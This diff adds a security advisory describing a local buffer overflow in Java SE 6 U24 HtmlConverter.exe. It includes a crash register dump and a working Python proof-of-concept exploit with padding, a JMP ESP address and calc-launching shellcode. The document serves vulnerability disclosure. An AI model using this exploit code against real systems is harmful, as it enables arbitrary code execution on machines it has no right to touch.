@@ -1,0 +1,134 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/ORACLE-HTMLCONVERTER-BUFFER-OVERFLOW.txt
+
+
+Vendor:
+===============
+www.oracle.com
+
+
+Product:
+========================================
+Java Platform SE 6 U24 HtmlConverter.exe
+Product Version: 6.0.240.50
+
+
+The HTML Converter is part of Java SE binary part of the JDK and Allows web
+page authors to explicitly target
+the browsers and platforms used in their environment when modifying their
+pages.
+
+
+
+Vulnerability Type:
+============================
+Buffer Overflow
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=====================
+
+When calling htmlConverter.exe with specially crafted payload it will cause
+buffer overflow executing arbitrary attacker supplied code.
+This was a small vulnerability included as part of the overall Oracle CPU
+released on January 19, 2016.
+
+Reference:
+http://www.oracle.com/technetwork/topics/security/cpujan2016-2367955.html
+
+
+
+registers ...
+
+EAX FFFFFFFE
+ECX FFFFFFFE
+EDX 0008E3C8
+EBX 7EFDE000
+ESP 0018FEB4
+EBP 0018FF88
+ESI 00001DB1
+EDI 00000000
+EIP 52525252                          <-------- "RRRR" \x52
+C 0  ES 002B 32bit 0(FFFFFFFF)
+P 0  CS 0023 32bit 0(FFFFFFFF)
+A 1  SS 002B 32bit 0(FFFFFFFF)
+Z 0  DS 002B 32bit 0(FFFFFFFF)
+S 0  FS 0053 32bit 7EFDD000(FFF)
+T 0  GS 002B 32bit 0(FFFFFFFF)
+D 0
+
+
+
+Exploit code(s):
+===============
+
+###pgm="C:\\Oracle\\Middleware\\jdk160_24\\bin\\HtmlConverter.exe "
+ #EIP @ 2493
+pgm="C:\\Program Files (x86)\\Java\jdk160_24\\bin\\HtmlConverter.exe "
+#EIP 2469 - 2479
+
+#shellcode to pop calc.exe Windows 7 SP1
+sc=("\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
+"\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"
+"\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"
+"\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"
+"\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"
+"\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"
+"\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC")
+
+
+#JMP ESP kernel32.dll
+rp=struct.pack('<L', 0x76E72E2B)
+
+
+payload="A"*2469+rp+"\x90"*10+sc
+subprocess.Popen([pgm, payload], shell=False)
+
+
+Disclosure Timeline:
+=====================================
+Vendor Notification: August 28, 2015
+January 20, 2016  : Public Disclosure
+
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+
+Severity Level:
+===============
+Medium
+
+
+
+Description:
+=============================================================
+
+Vulnerable Product:     [+] Java SE 6 U24 HtmlConverter.exe
+
+=============================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
